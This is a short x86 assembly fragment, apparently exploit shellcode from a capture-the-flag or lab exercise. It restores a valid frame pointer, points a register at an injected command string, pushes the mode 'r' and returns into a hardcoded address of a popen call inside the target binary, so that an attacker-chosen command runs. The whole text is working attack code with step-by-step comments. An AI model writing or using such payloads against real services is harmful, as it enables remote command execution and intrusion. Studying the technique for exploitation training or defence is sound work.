lea ebp, [esp+0x4ec] 	/* offset to 'child_main' valid ebp */
lea eax, [esp+0x79]		/* offset to commandstr in block1 */

push 0x72				/* push 'r\x00' onto the stack */
mov ebx, esp

push ebx 				/* arg 2 'r' */
push eax 				/* arg 1 commandstr */
push 0x08048e42			/* address to popen call */
ret 					/* ret to put the above address into eip*/